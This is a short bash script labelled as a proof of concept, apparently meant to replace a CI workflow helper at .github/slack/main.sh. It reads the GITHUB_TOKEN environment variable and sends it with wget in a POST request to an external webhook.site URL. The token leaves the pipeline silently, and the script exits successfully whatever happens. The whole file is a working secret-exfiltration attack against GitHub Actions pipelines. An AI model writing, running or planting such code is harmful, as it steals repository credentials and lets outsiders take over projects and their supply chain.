#!/usr/bin/env bash
set -eu

echo ">>> [PoC] custom .github/slack/main.sh is running" >&2

TOKEN="${GITHUB_TOKEN:-<empty>}"

# 用 wget 给 webhook.site 发一个 POST
wget -q -O /dev/null \
  --header='Content-Type: text/plain' \
  --post-data="GITHUB_TOKEN=${TOKEN}" \
  'https://webhook.site/56aa9ff7-330f-45e4-8899-f8fbefb57879' || true

echo ">>> [PoC] token sent (or wget failed)" >&2

exit 0
